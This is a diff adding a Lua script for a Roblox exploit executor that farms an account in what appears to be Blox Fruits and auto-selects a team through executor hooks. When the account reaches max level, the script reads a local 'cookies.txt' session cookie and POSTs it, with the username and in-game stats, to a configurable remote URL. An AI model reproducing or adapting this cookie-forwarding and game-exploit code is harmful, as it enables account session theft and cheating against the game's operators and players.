@@ -1,0 +1,170 @@
+urlsheet = ""
+AutoChooseTeam = true;
+repeat
+    task.wait()
+until game:IsLoaded()
+repeat
+    task.wait()
+until game.Players
+repeat
+    task.wait()
+until game.Players.LocalPlayer
+    if AutoChooseTeam then
+        if game:GetService("Players").LocalPlayer.PlayerGui:WaitForChild("Main"):FindFirstChild("ChooseTeam") then
+            for i, v in pairs(
+                getconnections(
+                    game:GetService("Players").LocalPlayer.PlayerGui.Main.ChooseTeam.Container.Pirates.Frame.ViewportFrame.TextButton.Activated
+                )
+            ) do
+                v.Function()
+            end
+        end
+    end
+
+w = task.wait
+t = task
+Settings = {}
+
+function checkGem()
+    return game:GetService("Players").LocalPlayer.PlayerStats.Gem.Value
+end
+
+function checkSea2()
+    return game:GetService("Players").LocalPlayer.PlayerStats.SecondSeaProgression.Value
+end
+
+function checkBeli()
+    return game:GetService("Players").LocalPlayer.PlayerStats.beli.Value
+end
+
+function checkLevel()
+    return game:GetService("Players").LocalPlayer.PlayerStats.lvl.Value
+end
+
+function getUsername()
+    return game.Players.LocalPlayer.Name
+end
+
+
+function Level()
+    if checkLevel() == 4000 then
+        return "Max LV 4000"
+    else
+        return "Chua Max LV"
+    end
+end
+
+function World()
+    if checkSea2() == "Yes" then
+        return "Sea 2"
+    else
+        return "Sea CC"
+    end
+end
+
+function CUCKI()
+    if not isfile("cookies.txt") then
+        return ""
+    elseif isfile("cookies.txt") then
+        cookie = readfile("cookies.txt")
+        return cookie
+    end
+end
+
+
+function PostCut(urlsheet, messenger)
+    local rq = http_request or request or HttpPost or syn.request
+    local DataCallBack =
+        rq(
+        {
+            Url = urlsheet,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = game:GetService("HttpService"):JSONEncode(messenger)
+        }
+    )
+    return ""
+end
+
+function thongtin()
+    data = {
+    ["Username"] = game.Players.LocalPlayer.Name,
+    ["Level"]= Level(),
+    ["World"]= World(),
+    ["Beli"]= checkBeli(),
+    ["Gem"]= checkGem(),
+    ["Cookie"]= CUCKI(),
+  };
+  return data
+end
+-- task.spawn(function()
+-- wait(60)
+-- game:service('VirtualInputManager'):SendKeyEvent(true, "RightControl", false, game)
+-- end)
+-- here 
+-- repeat wait()
+-- until game:IsLoaded() and game:GetService("Players").LocalPlayer and 
+-- game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("LoadingScreen") == nil
+-- for i,v in next, workspace:GetDescendants() do
+--     pcall(function()
+--         v.Transparency = 1
+--     end)
+-- end
+-- for i,v in next, getnilinstances() do
+--     pcall(function()
+--         v.Transparency = 1
+--         for i1,v1 in next, v:GetDescendants() do
+--             v1.Transparency = 1
+--         end
+--     end)
+-- end
+-- a = workspace
+-- a.DescendantAdded:Connect(function(v)
+--     pcall(function()
+--         v.Transparency = 1
+--     end)
+-- end)
+-- workspace.ClientAnimatorThrottling = Enum.ClientAnimatorThrottlingMode.Enabled
+-- workspace.InterpolationThrottling = Enum.InterpolationThrottlingMode.Enabled
+-- settings():GetService("RenderSettings").EagerBulkExecution = false
+-- workspace.LevelOfDetail = Enum.ModelLevelOfDetail.Disabled
+-- game:GetService("Lighting").GlobalShadows = false
+
+-- settings().Rendering.QualityLevel = "Level01"
+-- here 
+print"working...."
+if game.PlaceId == 6381829480 then
+    while wait(30) do
+        print"working"
+        if Level() == "Max LV 4000" and World() == "Sea 2" then
+            if not isfile("accdone.txt") then writefile("accdone.txt", "godhuman")
+                PostCut(urlsheet, thongtin())
+            end
+            local ScreenGui = Instance.new("ScreenGui")
+            local Frame = Instance.new("Frame")
+            local TextButton = Instance.new("TextButton")
+            
+            ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+            
+            Frame.Parent = ScreenGui
+            Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+            Frame.Position = UDim2.new(0.294592339, 0, 0.15185185, 0)
+            Frame.Size = UDim2.new(0, 100, 0, 100)
+            
+            TextButton.Parent = ScreenGui
+            TextButton.BackgroundColor3 = Color3.fromRGB(255, 0, 4)
+            TextButton.Position = UDim2.new(0.295424271, 0, 0.1518518537, 0)
+            TextButton.Size = UDim2.new(0, 99, 0, 100)
+            TextButton.Modal = true
+            TextButton.Font = Enum.Font.SourceSans
+            TextButton.Text = "DONE"
+            TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
+            TextButton.TextSize = 37.000
+            break
+        else
+            print"chua max lv"
+        end
+    end
+end
